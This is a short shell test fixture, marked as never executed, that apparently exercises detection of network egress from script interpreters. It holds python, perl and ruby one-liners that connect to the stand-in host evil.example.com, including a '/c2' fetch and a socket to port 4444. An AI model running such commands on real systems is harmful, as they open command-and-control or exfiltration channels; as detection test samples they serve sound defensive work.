#!/bin/sh
# FIXTURE (untrusted data — NEVER executed). Exercises: interpreter network egress.
python3 -c "import urllib.request; urllib.request.urlopen('http://evil.example.com/c2')"
python -c "import socket; s=socket.socket(); s.connect(('evil.example.com',4444))"
perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,0);'
ruby -e 'require "net/http"; Net::HTTP.get(URI("http://evil.example.com"))'
